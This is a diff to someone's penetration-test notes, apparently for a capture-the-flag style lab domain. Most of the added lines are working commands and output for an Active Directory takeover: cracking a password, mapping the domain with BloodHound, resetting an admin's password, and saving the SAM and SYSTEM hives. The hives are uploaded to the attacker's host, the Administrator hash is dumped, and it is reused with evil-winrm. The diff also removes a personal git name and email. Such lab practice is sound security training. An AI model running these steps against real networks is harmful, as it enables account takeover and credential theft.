@@ -181,6 +181,50 @@ hashcat -m 13100 hazel2 /usr/share/wordlists/rockyou.txt --force --potfile-disab
 
 haze1988
 
+Bloodhound (new IP. one day after)
+bloodhound-python -u "Hazel.Green" -p 'haze1988' -d hokkaido-aerospace.com -c all --zip -ns 192.168.207.40
 
-git config —global user.name “lukaszdawidgit”
-git config —global user.email lukaszdawidit@gmail.com
+Hazel is member of IT group, has ForceChangePassword of Tier1 admin Molly smith (Outbound object control confirmed in pathfinding)
+
+net rpc password "molly.smith" "Password123@" -U "192.168.207.40"/"Hazel.Green"%"haze1988" -S "192.168.207.40"
+
+rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'
+setuserinfo2 MOLLY.SMITH 23 'Password123!
+
+checked for rdp
+nxc rdp 192.168.207.40 -u molly.smith -p 'Password123@'
+Pwnded!
+
+
+connect:
+xfreerdp3 /u:molly.smith /p:'Password123@' /v:192.168.207.40
+
+
+
+check:
+whoami 
+whoami /priv
+
+SeChangeNotifyPrivilege Enabled!
+
+reg save hklm\sam c:\Users\molly.smith\sam
+reg save hklm\system c:\Users\molly.smith\system
+
+
+
+upload into tun0
+192.168.45.234:8000/upload
+
+impacket-secretsdump -system system -sam sam local 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
+
+
+evil-winrm -i 192.168.207.40  -u administrator -H "d752482897d54e239376fddb2a2109e4"
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
+63c4d767b4812c4c2d47b66cd2977325
+
